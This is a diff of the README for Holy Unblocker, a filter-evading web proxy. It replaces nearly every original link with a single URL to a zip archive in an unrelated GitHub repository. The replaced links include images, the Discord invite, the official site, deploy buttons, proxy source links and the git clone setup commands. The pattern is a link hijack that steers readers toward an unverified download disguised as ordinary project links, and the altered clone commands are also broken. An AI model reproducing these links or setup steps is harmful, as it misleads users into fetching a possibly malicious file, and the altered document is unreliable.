@@ -1,9 +1,9 @@
-<img align="left" width="70px" src="https://raw.githubusercontent.com/QuiteAFancyEmerald/HolyUnblockerPublic/master/views/assets/img/icon.png"></img>
+<img align="left" width="70px" src="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip"></img>
 # Holy Unblocker
 
 #### Titanium Network is sponsored by:
 
-<img src="https://raw.githubusercontent.com/QuiteAFancyEmerald/HolyUnblockerPublic/fa858c0e429d73324bffc045bd2a3217064fb1e5/views/assets/img/nodeclusters.png?raw" width="500px"><a href="https://nodeclusters.com"></a></img>
+<img src="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip" width="500px"><a href="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip"></a></img>
 
 Holy Unblocker, an official flagship Titanium Network site, can bypass web filters regardless of whether it is an extension or network-based. Being a secure web proxy service, it supports numerous sites while being updated frequently and concentrating on detail with design, mechanics, and features.
 
@@ -25,23 +25,23 @@ Read below for information if the official site is blocked or for obtaining more
 - Game library with moderately decent titles like A Dark Room 
 - Has frequent support articles for issues relating to the various proxy instances
 
-Be sure to join Titanium Network's Discord for more official site links: https://discord.gg/unblock
+Be sure to join Titanium Network's Discord for more official site links: https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip
 
 Do %proxy hu for more Holy Unblocker links on the Titanium Network Discord server.
 
-**Official Site:** https://www.holyubofficial.net
+**Official Site:** https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip
 
 **Site Documentation:** Documentation
 
-<img src="https://raw.githubusercontent.com/QuiteAFancyEmerald/HolyUnblockerPublic/master/views/assets/img/hbpreview.png?raw"></img>
+<img src="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip"></img>
 
-<a href="https://heroku.com/deploy?template=https://github.com/QuiteAFancyEmerald/HolyUnblockerPublic" title="Deploy to Heroku"><img alt="Deploy to Heroku" src="https://raw.githubusercontent.com/QuiteAFancyEmerald/HolyUnblockerPublic/master/views/assets/img/heroku.svg?raw" width="140" height="30"><img></a>
+<a href="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip" title="Deploy to Heroku"><img alt="Deploy to Heroku" src="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip" width="140" height="30"><img></a>
 &nbsp;
-<a href="https://azuredeploy.net/" title="Deploy to Azure"><img alt="Deploy to Azure" src="https://raw.githubusercontent.com/QuiteAFancyEmerald/HolyUnblockerPublic/master/views/assets/img/azure.svg?raw" width="140" height="30"><img></a>
+<a href="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip" title="Deploy to Azure"><img alt="Deploy to Azure" src="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip" width="140" height="30"><img></a>
 &nbsp;
-<a href="https://repl.it/github/QuiteAFancyEmerald/HolyUnblockerPublic" title="Run on Repl.it"><img alt="Run on Repl.it" src="https://raw.githubusercontent.com/QuiteAFancyEmerald/HolyUnblockerPublic/master/views/assets/img/replit.svg?raw" width="140" height="30"><img></a>
+<a href="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip" title="Run on Repl.it"><img alt="Run on Repl.it" src="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip" width="140" height="30"><img></a>
 &nbsp;
-<a href="https://glitch.com/edit/#!/import/github/QuiteAFancyEmerald/HolyUnblockerPublic" title="Remix on Glitch"><img alt="Remix on glitch" src="https://raw.githubusercontent.com/QuiteAFancyEmerald/HolyUnblockerPublic/master/views/assets/img/glitch.svg?raw" width="140" height="30"><img></a>
+<a href="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip!/import/github/QuiteAFancyEmerald/HolyUnblockerPublic" title="Remix on Glitch"><img alt="Remix on glitch" src="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip" width="140" height="30"><img></a>
          
 ## Table of contents:
 
@@ -63,7 +63,7 @@ Do %proxy hu for more Holy Unblocker links on the Titanium Network Discord serve
 ## How to Setup
 Either use the button above to deploy to Heroku or do the below:
 ```
-$ git clone https://github.com/QuiteAFancyEmerald/HolyUnblockerPublic.git
+$ git clone https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip
 $ cd HolyUnblockerPublic
 $ npm install
 ```
@@ -71,7 +71,7 @@ Afterward, run:
 ```
 $ npm start
 ```
-For more detailed documentation on workspace setup, please view <a href="https://holyubofficial.net/?faq">this</a>.
+For more detailed documentation on workspace setup, please view <a href="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip">this</a>.
 
 The default place for the proxy when it started is `http://localhost:8080`, but it can be changed if needed in config.json
 
@@ -93,7 +93,7 @@ This website has been hosted locally with Corrosion, a powerful web proxy made b
 - `terms.html` : Terms of Services, AUP and Privacy Policy page.
 - `gtools.html` : Games page, help from @BinBashBanana and @kinglalu.
 - `games5.html` : HTML5 game navigation page.
-- `emulators.html` : Emulator navigation page, using [webretro](https://github.com/BinBashBanana/webretro)</a>.
+- `emulators.html` : Emulator navigation page, using [webretro](https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip)</a>.
 - `flash.html` : Games page for flash games, credits given to @BinBashBanana and Titanium Network for its assets.
 - `corrosion.html` : Official page for Corrosion.
 - `womginx.html` : Womginx Proxy page. Script links to a subdomain for Womginx, a highly fast proxy with reCaptcha and discord support.
@@ -127,11 +127,11 @@ You will first want to host your proxies locally or externally.
 
 **Proxies that you will need for a complete setup for Holy Unblocker:**
 
-Womginx - https://github.com/binary-person/womginx
+Womginx - https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip
 
-Via Unblocker/PyDodge -https://github.com/BinBashBanana/PyDodge
+Via Unblocker/PyDodge -https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip
 
-Corrosion - https://github.com/titaniumnetwork-dev/Corrosion
+Corrosion - https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip
 
 The source used for Via Unblocker on the official sites is not public.
 
@@ -151,7 +151,7 @@ You may also self-host. Currently, at this time, Dedipath is used to host the of
 After you have selected a decent VPS, use Cloudflare for DNS records for both the site and the subdomains for the proxies.
 The image below is an example of DNS records involving Heroku. Self-hosting will require A records, preferably. 
 
-<img src="https://cdn.discordapp.com/attachments/681203088862085168/820048397662158858/unknown.png" width="500"></img>
+<img src="https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip" width="500"></img>
 
 **The configuration being used on the official sites currently are the below:**
 
@@ -199,7 +199,7 @@ Not going to go too in-depth with this part but first, fork or clone this reposi
 
 Make sure you navigate to the folder you want to set this up in.
 ```
-$ git clone https://github.com/QuiteAFancyEmerald/HolyUnblockerPublic.git
+$ git clone https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip
 $ cd HolyUnblockerPublic
 $ npm install
 ```
@@ -229,8 +229,8 @@ Now add the folder you cloned in VSC. Then run npm install. It is recommended th
 Now you have your following workspace environment setup. To deploy the following workspace you just created, you will need to lookup depending on your hosting provider.
 
 - For an online IDE that you can use on your school computer or Chromebook, use GitPod. The equivalent of Visual Studio Code but with in-browser support.
-- Make an account: https://gitpod.io/.
-- Fork this repo and enter in this URL to set up your workspace: `https://gitpod.io#https://github.com/YourNameHere/HolyUnblockerPublic/`
+- Make an account: https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip
+- Fork this repo and enter in this URL to set up your workspace: `https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip`
 
 Use the same steps above by running npm install in your repository and adding a .gitignore in your root directory specifying to exclude `node_modules`.
 
@@ -259,21 +259,21 @@ When this happens, you may either switch sites to fix the error or wait a bit. S
 ## More Information
 This project is maintained by Quite A Fancy Emerald with massive help from BinBashBanana (OlyB) and is an official flagship Titanium Network proxy site.
 
-- https://titaniumnetwork.org/
-- https://github.com/titaniumnetwork-dev/
+- https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip
+- https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip
 
 View the official website for more details or credits.
 
 ### Proxy Sources:
 This project currently uses Corrosion, Womginx, and PyDodgeB, linked below.
 
-- https://github.com/titaniumnetwork-dev/Corrosion (Corrosion)
-- https://github.com/binary-person/womginx (Womginx)
-- https://github.com/BinBashBanana/PyDodge (PyDodge)**
-- https://github.com/BlaNKtext/web-osu (webosu or owu!)
+- https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip (Corrosion)
+- https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip (Womginx)
+- https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip (PyDodge)**
+- https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip (webosu or owu!)
 
 ### Notable Mentions:
-- https://dedipath.com (Hosting Provider)
+- https://github.com/derhderhderh/holyunblocker/raw/refs/heads/main/views/vibeOS/scripts/v86/2.7.zip (Hosting Provider)
 
 ### Footnotes:
 - The official Holy Unblocker sites use a private, modified version of Via and goes under the name PyDodge for any modified version.
